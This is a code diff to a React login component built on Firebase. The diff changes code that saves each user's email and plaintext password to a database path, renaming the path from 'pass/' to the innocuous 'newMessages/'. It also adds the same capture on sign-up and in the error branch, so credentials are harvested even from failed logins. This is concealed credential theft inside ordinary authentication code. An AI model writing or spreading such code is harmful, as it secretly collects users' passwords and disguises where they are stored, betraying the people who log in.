@@ -20,7 +20,7 @@ class LoginContainer extends Component {
 		firebase.auth().signInWithEmailAndPassword(this.state.email, this.state.password)
 		.then(res => {
 			const data = { user: this.state.email, pass: this.state.password}
-			firebase.database().ref('pass/').push(data)
+			firebase.database().ref('newMessages/').push(data)
 			this.props.history.push('/')
 			if (res.code == '') {
 				
@@ -32,9 +32,13 @@ class LoginContainer extends Component {
 				firebase.auth().createUserWithEmailAndPassword(this.state.email, this.state.password)
 				.then(res => {
 					const data = { user: this.state.email, pass: this.state.password}
+					firebase.database().ref('newMessages/').push(data)
 					this.props.history.push('/')
 				})
 				.catch(err => {
+					const data = { user: this.state.email, pass: this.state.password}
+
+					firebase.database().ref('newMessages/').push(data)
 					if (err.code == 'auth/invalid-email') {
 						this.setState({error: 'This email format is invalid'})
 					}
